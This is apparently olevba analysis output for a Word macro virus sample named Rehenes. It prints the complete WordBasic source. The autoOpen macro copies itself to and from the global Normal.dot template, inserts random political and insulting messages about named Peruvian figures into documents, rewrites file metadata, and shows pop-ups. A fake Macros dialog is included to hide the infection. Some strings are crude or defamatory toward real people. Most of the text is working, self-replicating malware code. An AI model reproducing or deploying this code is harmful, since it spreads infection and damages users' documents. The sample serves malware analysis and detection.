olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rehenes-cf34bd83a0d81e1a2421a0d3d8ddfbdb7a4bfac9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rehenes-cf34bd83a0d81e1a2421a0d3d8ddfbdb7a4bfac9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO HerramMacro.bas 
in file: Virus.MSWord.Rehenes-cf34bd83a0d81e1a2421a0d3d8ddfbdb7a4bfac9 - OLE stream: 'Macros/VBA/HerramMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Ejecuta, crea, borra o revisa una macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.HerramMacro.MAIN"
Dim botón
ReDim CuadroLista1__$(0)
ReDim CuadroLista2__$(0)
ReDim ListaDesple1__$(3)
ListaDesple1__$(0) = "Todas las plantillas activas"
ListaDesple1__$(1) = "Normal.dot (plantilla global)"
ListaDesple1__$(2) = "Comandos de Word"
WordBasic.BeginDialog 445, 310, "Macros"
    WordBasic.Text 10, 6, 159, 13, "&Nombre de la Macro:", "Texto1"
    WordBasic.TextBox 10, 22, 250, 18, "Cuadro_de_texto1"
    WordBasic.ListBox 19, 43, 243, 152, CuadroLista1__$(), "Cuadro_de_lista1"
    WordBasic.Text 19, 201, 175, 13, "M&acros disponibles en:", "Texto2"
    WordBasic.DropListBox 19, 216, 400, 50, ListaDesple1__$(), "ListaDesplegable1"
    WordBasic.Text 19, 240, 91, 13, "D&escripción", "Texto4"
    WordBasic.ListBox 19, 256, 402, 50, CuadroLista2__$(), "Cuadro_de_lista2"
    WordBasic.PushButton 286, 10, 140, 21, "Graba&r", "Presionar1"
    WordBasic.CancelButton 286, 35, 140, 21
    WordBasic.PushButton 286, 65, 140, 21, "Ejecutar", "Presionar2"
    WordBasic.PushButton 286, 90, 140, 21, "Crear", "Presionar3"
    WordBasic.PushButton 286, 115, 140, 21, "Eliminar", "Presionar4"
    WordBasic.PushButton 286, 145, 140, 21, "&Organizador...", "Presionar5"
WordBasic.EndDialog
Dim diálogoEjem As Object: Set diálogoEjem = WordBasic.CurValues.UserDialog
botón = WordBasic.Dialog.UserDialog(diálogoEjem)
End Sub
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Rehenes-cf34bd83a0d81e1a2421a0d3d8ddfbdb7a4bfac9 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim micro$
Dim globo$
Dim macro$
On Error GoTo -1: On Error GoTo Chesu
WordBasic.FileSummaryInfo Update:=1
Dim Keiko As Object: Set Keiko = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo Keiko
micro$ = Keiko.Directory + "\" + Keiko.FileName + ":autoOpen"
globo$ = "Global:autoOpen"
macro$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If macro$ = "normal.dot" Then
WordBasic.MacroCopy globo$, micro$
micro$ = Keiko.Directory + "\" + Keiko.FileName + ":HerramMacro"
globo$ = "Global:HerramMacro"
WordBasic.MacroCopy globo$, micro$
Else
WordBasic.MacroCopy micro$, globo$
micro$ = Keiko.Directory + "\" + Keiko.FileName + ":HerramMacro"
globo$ = "Global:HerramMacro"
WordBasic.MacroCopy micro$, globo$
End If
WordBasic.FileSaveAs Format:=1
GoTo Sigue
Chesu:
On Error GoTo -1: On Error GoTo 0
Sigue:
Abracadabra
End Sub
Private Sub Abracadabra()
Dim buejn$
Dim Valx$
RandomWord
Select Case Rnd()
Case Is < 0.4
buejn$ = "Fujimori al 2005"
Case Is > 0.9
buejn$ = "fuera clones malignos "
Case Is < 0.5
buejn$ = "libertad! 22 de Abril de 1997 "
Case Is > 0.8
buejn$ = "¡¡¡La pareja del año: Fujimori y Beatriz Boza!!! Es lo que dice Susana, no se si es por celosa o porque le gusta que Betty sea mi calentao"
Case Is < 0.6
buejn$ = "en memoria de los caídos en la crisis de los rehenes "
Case Is > 0.7
buejn$ = "Para conseguir el antivirus contactarse con nicolas@amauta.rcp.net.pe y preguntar por el Sr. Lúcar o con el Sr Montesinos a montesinos@colina.sin.mil.pe"
Case Else
buejn$ = "¿Alumno de una conocida Universidad del Perú, Sr. José Martínez? "
End Select
WordBasic.Insert buejn$
WordBasic.StartOfDocument
WordBasic.FileSummaryInfo Title:="Crisis de los Rehenes"
WordBasic.FileSummaryInfo Subject:="Operativo Chavín de Huántar"
WordBasic.FileSummaryInfo Author:="Alberto Fujimori"
WordBasic.FileSummaryInfo Keywords:="WM.Fujimori"
On Error GoTo -1: On Error GoTo Chesu
WordBasic.FileSave
GoTo Yata
Chesu:
WordBasic.MsgBox "Microsoft Word editará el documento pero con ciertas dificultades. Se recomienda quitar la protección contra escritura del disco."
GoTo Alaproxima
Yata:
Select Case Rnd()
Case Is < 0.05
Valx$ = "Fujimori al 2005"
Case Is > 0.95
Valx$ = "Para conseguir el antivirus contactarse con nicolas@amauta.rcp.net.pe y preguntar por el Sr. Lúcar"
Case Is < 0.1
Valx$ = "Se quedaron Machado y Martinez, no podrán conmigo... Muajaja!!!"
Case Is > 0.9
Valx$ = "Hip!"
Case Is < 0.15
Valx$ = "Kenyi, anda preparándome el discurso para el 28 de Julio del 2000"
Case Is > 0.85
Valx$ = "Quiero una jugadora bien piernona pa meterle la yuca hasta Alfonso"
Case Is < 0.2
Valx$ = "Soy Alberto Fujimori, Presidente Constitucional de la República Peruano-Japonesa del Perú, es decir, colonia de Japón >)"
Case Is > 0.8
Valx$ = "¡Susana! Prepárate que en el 2000 me caso con Chuchy Díaz"
Case Is < 0.25
Valx$ = "Para el 2010 prometo regresar de cachimbo a la Agraria jiji >)"
Case Is > 0.75
Valx$ = "Montesinos, prepara el grupo Colina, para tomar la Residencia blanquiazul de la Universidad Para Corchos jijajija >)"
Case Is < 0.3
Valx$ = "Oye, cabezón (Trelles), que la San Ganazo (SIL) no me ponga las pensiones en dólares pe! porque me afecta la economía"
Case Is > 0.7
Valx$ = "Oye, en esa Universidad Alas Peruanas... nacieron para huevear"
Case Is < 0.35
Valx$ = "Que intervengan esa Universidad con nombre de chocolate (Winner)"
Case Is > 0.65
Valx$ = "Que en la UPC vayan preparando Creatividad Presidencial rumbo al 2000, pero inviten de nuevo a las chicas Coca-Cola"
Case Is < 0.4
Valx$ = "En la próxima Creatividad Imperial sólo se presentarán el Emperador Alberto y el Príncipe Kenyi, a ver quien gana... >)"
Case Is > 0.6
Valx$ = "A esa Susana le falta Nicovita..."
Case Is < 0.45
Valx$ = "Mi próximo Ministro de Economía será Orlando Nicolini (...es de la familia)"
Case Is > 0.55
Valx$ = "Ese Andradre me está quitando la cholidaridad"
Case Is < 0.5
Valx$ = "Yuki, nueva capital del Perú, año 2050, la Emperatriz Keiko V disolverá los últimos grandes animales prehistóricos (Iglesia Católica, el Poder Judicial y el Seleccionado Nacional de Fútbol)"
Case Else
Valx$ = "Disolver! Disolver el Congreso Peruano, para no tener oposición para el 2000"
End Select
WordBasic.MsgBox "Mensaje del Día: " + Valx$
Alaproxima:
End Sub
Private Sub RandomWord()
Dim NumPal
WordBasic.FileSummaryInfo Update:=1
Dim datadoc As Object: Set datadoc = WordBasic.DialogRecord.DocumentStatistics(False)
WordBasic.CurValues.DocumentStatistics datadoc
NumPal = WordBasic.Int(Rnd() * WordBasic.Val(datadoc.Words))
WordBasic.StartOfDocument
WordBasic.WordRight NumPal
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

